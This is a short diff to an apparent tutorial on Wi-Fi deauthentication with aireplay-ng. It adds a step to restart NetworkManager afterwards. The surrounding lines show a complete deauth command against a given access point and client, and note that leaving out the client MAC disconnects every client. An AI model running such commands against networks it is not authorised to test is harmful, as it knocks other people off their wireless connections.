@@ -42,3 +42,8 @@ aireplay-ng -0 0 -a 50:C7:BF:DC:4C:E8 -c E0:B5:2D:EA:18:A7 wlan0mon
 -c E0:B5:2D:EA:18:A7 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated.
 wlan0mon is the interface name.
 ```
+
+## After using
+```
+service NetworkManager restart
+```
